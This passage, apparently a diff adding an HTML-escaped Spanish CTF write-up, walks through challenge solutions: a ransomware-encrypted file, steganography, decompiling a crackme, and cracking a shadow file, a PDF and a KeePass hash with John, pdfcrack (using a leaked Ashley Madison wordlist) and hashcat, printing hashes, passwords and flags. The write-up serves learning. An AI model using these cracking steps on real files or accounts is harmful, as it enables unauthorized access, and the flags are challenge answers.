angeles the elephant had a pig friend who taught math the pig exploded one day and left the whole world wondering since the pig exploded the king pig blamed the giants since the giants hated being blamed they led an attack on the king and since they were of course much bigger they were victorious after the giants took control of greenland they started fighting the vikings from iceland the opponents were eqenly matched so they ended up destroying each other and they became extinct then the gorillas stole the honda trail s from tony soprano the lead gangster from italy tony soprano actually got the honda s from india anyhow back to the gorillas the gorillas started causing a rukus in the big apple actually a big apple where they ran over billy joe and eileen since the football players were chasing them the gorillas hopped into the giant peach with james who was escaping his evil parents the story ends there i m sorry to say but oh well hey hey hey the flag is they all lived happily eqer after
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Se cambio la &lt;code&gt;q&lt;/code&gt; por una &lt;code&gt;v&lt;/code&gt;.&lt;br /&gt;
+&lt;code&gt;they all lived happily eqer after&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag: they all lived happily ever after&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;save-me&#34;&gt;SAVE ME!&lt;/h2&gt;
+&lt;p&gt;Archivos &lt;code&gt;.fun&lt;/code&gt;, Investigamos sobre la extension de estos archivos y encontramos que es un virus de tipo ransomware, el cual encripta los archivos con esa extension.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.pcrisk.es/guias-de-desinfeccion/8248-fun-ransomware&#34;&gt;https://www.pcrisk.es/guias-de-desinfeccion/8248-fun-ransomware&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Para obtener los archivos encriptados en el archivo del reto utilizamos jigsaw.exe el cual nos permite desencriptar este tipo de archivos.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/fun_fa.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{Jigsaw_ransomware_in_house}&lt;/code&gt;&lt;/p&gt;
+&lt;h1 id=&#34;esteganografia&#34;&gt;ESTEGANOGRAFIA&lt;/h1&gt;
+&lt;h2 id=&#34;data&#34;&gt;DATA&lt;/h2&gt;
+&lt;p&gt;Utilizamos exif para ver los metadatos de la imagen y encontramos la flag.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/data.jpg&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/data_stega.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{metadata_in_the_dark}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;matrix&#34;&gt;MATRIX&lt;/h2&gt;
+&lt;p&gt;Utilizamos inlite para decodificar la imagen &lt;a href=&#34;https://online-barcode-reader.inliteresearch.com/&#34;&gt;https://online-barcode-reader.inliteresearch.com/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/matrix_flag.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{matr1x_qr}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;mondrian&#34;&gt;MONDRIAN&lt;/h2&gt;
+&lt;p&gt;Una imagen que tiene un mensaje oculto, este lenguaje se llama &lt;code&gt;piet&lt;/code&gt; y se encuentra en imagenes que parecen estilo abstractas. (&lt;a href=&#34;http://www.dangermouse.net/esoteric/piet.html&#34;&gt;http://www.dangermouse.net/esoteric/piet.html&lt;/a&gt;)&lt;/p&gt;
+&lt;p&gt;Decodificamos la imagen aqui:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.bertnase.de/npiet/npiet-execute.php&#34;&gt;https://www.bertnase.de/npiet/npiet-execute.php&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/Mondrian.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/modrian_flag.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{p1et_programm1ng!}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;hide&#34;&gt;HIDE&lt;/h2&gt;
+&lt;p&gt;Utilizamos binwalk para extraer lo que esta en el interior de la imagen, al extraer el archivo descomprimimos de nuevo y obtenemos un archivo txt, este nos indica que esta en diferentes bases, decodificamos el mensaje en &lt;code&gt;base64&lt;/code&gt; y &lt;code&gt;base32&lt;/code&gt; para obtener la flag.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/walk_stego.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;tryhackme{b1nw4lk_0r_f0r3mo5t}&lt;/code&gt;&lt;/p&gt;
+&lt;h1 id=&#34;reversing&#34;&gt;REVERSING&lt;/h1&gt;
+&lt;h2 id=&#34;crackme1&#34;&gt;CRACKME1&lt;/h2&gt;
+&lt;p&gt;Para hacer una compilacion inversa al archivo crackme.pyc existe una herramienta llamada uncompyle2 para obtener el codigo fuente equivalente al archivo.&lt;/p&gt;
+&lt;p&gt;Comando:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;uncompyle2 crackme.pyc -o crackme.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Codigo fuente (Ordenado manualmente para obtener la flag):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;random&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;lr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;db&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;ef&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;s&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;ty&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;gh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;!&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;aa&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;O&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;rr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;p&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;nn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;chains&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;104&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;105&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;115&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;105&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;115&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;97&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;114&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;111&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;108&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;108&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;chars&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;lock_pick&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;randint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lock_pick&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;105&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;115&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;110&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;111&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;104&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;97&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;101&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;97&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;115&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;121&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;auth&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;107&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;101&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;101&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;112&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;114&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;121&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;105&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;110&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;103&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lock_pick&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;slither&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;aa&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;db&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;nn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ef&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;gh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ty&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;slither&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;keys&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;112&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;97&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;115&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;115&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;119&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;111&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;114&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Authentication required&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;user_input&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;raw_input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Enter your username&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_input&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;slither&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+  &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;yeeeea! correct user!&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+  &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Wrong username try harder&amp;#39;&lt;/span&gt;
+  &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;flag: Owasp!23&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;crackme2&#34;&gt;CRACKME2&lt;/h2&gt;
+&lt;p&gt;Utilizamos rabin2 para obtener las strings dentro del archivo bin y obtuvimos el usuario correcto.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/crackme2.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag: hax0r&lt;/code&gt;&lt;/p&gt;
+&lt;h1 id=&#34;misc&#34;&gt;MISC&lt;/h1&gt;
+&lt;h2 id=&#34;shadow&#34;&gt;SHADOW&lt;/h2&gt;
+&lt;p&gt;Un archivo que contiene la contraseña del usuario root, usamos john the ripper para obtener la ocnttraseña.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/shadow_john.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{toor} &lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;register&#34;&gt;REGISTER&lt;/h2&gt;
+&lt;p&gt;La bandera de este reto pertenece al reto de registrarse en la plataforma. &lt;a href=&#34;http://ctf.develsecurity.com/0x1&#34;&gt;http://ctf.develsecurity.com/0x1&lt;/a&gt; En hora buena por tu registro , tu premio es la flag para el reto register en la categoria misc.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{00010!}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;pdf&#34;&gt;PDF&lt;/h2&gt;
+&lt;p&gt;Utilizamos pdfcrack y el diccionario Ashley Madison. Diccionario: &lt;a href=&#34;https://raw.githubusercontent.com/dustyfresh/dictionaries/master/AshleyMadisonCracked.txt&#34;&gt;https://raw.githubusercontent.com/dustyfresh/dictionaries/master/AshleyMadisonCracked.txt&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Comando:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pdfcrack -f flag-protected.pdf -w AshleyMadisonCracked.txt 
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Contraseña: &lt;code&gt;zerkalo1974&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/pdf_ashley.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{pdfcrack_was_here!}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;keep&#34;&gt;KEEP&lt;/h2&gt;
+&lt;p&gt;Utilizamos &lt;code&gt;keepass2john&lt;/code&gt; para obtener el hash y hashcat para obtener la contraseña del archivo.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;$keepass$*2*60000*0*cc74b5166afe1df0757d8d208078d4d2f9fe3e331ff730b9cb5cfb94064eea50*b6d616ca2c797d4a942df786640acc92749f8005fc2b31114c0ba5b2aced9a5e*459b7fe3b1200a8b48ad9663925465c4*72cdc691f0f93f79476c83f8b1f1db44ab23ca6217048cd67bbde5e8ff76b402*1acb7f5538987791204995bc3c1ba96a254b3be85051946058b07ee6ef1b4d45
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Comando hashcat:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;hashcat64.bin -m &lt;span class=&#34;m&#34;&gt;13400&lt;/span&gt; keepas.txt ../rockyou.txt -o keepas_owasp.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Contraseña: &lt;code&gt;zaq1zaq1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos &lt;code&gt;keepassx&lt;/code&gt; para abrir el archivo &lt;code&gt;Database.kdbx&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/keepas_.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
